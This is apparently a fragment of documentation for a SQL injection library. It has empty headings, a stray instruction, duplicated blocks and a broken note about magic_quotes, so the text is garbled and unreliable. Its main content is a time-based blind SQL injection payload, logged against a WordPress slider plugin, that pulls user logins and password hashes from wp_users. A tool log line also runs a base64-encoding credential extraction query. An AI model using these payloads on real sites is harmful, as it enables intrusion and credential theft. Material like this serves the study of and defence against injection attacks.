## Supported Databases
## Supported Techniques
## How to use in a module
You'll need to start off by including the library.
```
[Sat Jan 02 14:11:53.103512 2021] [php7:notice] [pid 55607] [client 2.2.2.2:36475] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\';\\',ifnull(user_login,\\'\\'),ifnull(user_pass,\\'\\')) as binary) mMJZrCxQ from w' at line 1 for query SELECT * FROM wp_chopslider3 WHERE chopslider_id =938076279 OR 1=1 AND if(length(cast((select group_concat(mMJZrCxQ) from (select cast(concat_ws(\\';\\',ifnull(user_login,\\'\\'),ifnull(user_pass,\\'\\')) as binary) mMJZrCxQ from wp_users limit 1) fWLwo) as binary))&1<>0,sleep(1.0),0)
```

Next we create our SQLi object:
```
[*] {SQLi} Executing (select group_concat(qcO) from (select cast(concat_ws(';',to_base64(ifnull(user_login,'')),to_base64(ifnull(user_pass,''))) as binary) qcO from wp_users limit 1) dTWyw)
```

` can only return 1 column.

### magic_quotes bypass

*CAN ONLY RETURN ONE COLUMN AT A TIME*

At times, PHP will use `

`
[Sat Jan 02 14:11:53.103512 2021] [php7:notice] [pid 55607] [client 2.2.2.2:36475] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\';\\',ifnull(user_login,\\'\\'),ifnull(user_pass,\\'\\')) as binary) mMJZrCxQ from w' at line 1 for query SELECT * FROM wp_chopslider3 WHERE chopslider_id =938076279 OR 1=1 AND if(length(cast((select group_concat(mMJZrCxQ) from (select cast(concat_ws(\\';\\',ifnull(user_login,\\'\\'),ifnull(user_pass,\\'\\')) as binary) mMJZrCxQ from wp_users limit 1) fWLwo) as binary))&1<>0,sleep(1.0),0)
`

`
[*] {SQLi} Executing (select group_concat(qcO) from (select cast(concat_ws(';',to_base64(ifnull(user_login,'')),to_base64(ifnull(user_pass,''))) as binary) qcO from wp_users limit 1) dTWyw)
`

